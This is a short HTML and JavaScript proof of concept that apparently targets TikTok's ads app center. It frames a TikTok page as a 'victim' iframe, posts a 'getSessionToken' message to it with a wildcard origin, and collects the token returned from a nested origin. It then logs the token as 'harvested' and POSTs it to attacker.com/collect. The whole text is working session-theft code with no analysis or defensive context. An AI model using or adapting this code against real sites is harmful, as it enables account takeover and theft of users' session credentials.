<iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:100%; height:500px;"></iframe>

<script>
    const nestedOrigin = "https://imuu.xyz";

    document.getElementById('victim').onload = function() {
        const victimWin = this.contentWindow;
        
        // PostMessage goes inside TikTokâ€™s iframe now sitting on YOUR domain
        victimWin.postMessage({ action: "getSessionToken" }, "*");
    };

    window.addEventListener('message', (e) => {
        if (e.origin === nestedOrigin && e.data && e.data.token) {
            console.log("ðŸ”¥ Token harvested:", e.data);
            // Exfiltrate token
            fetch('https://attacker.com/collect', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ token: e.data })
            });
        }
    });
</script>
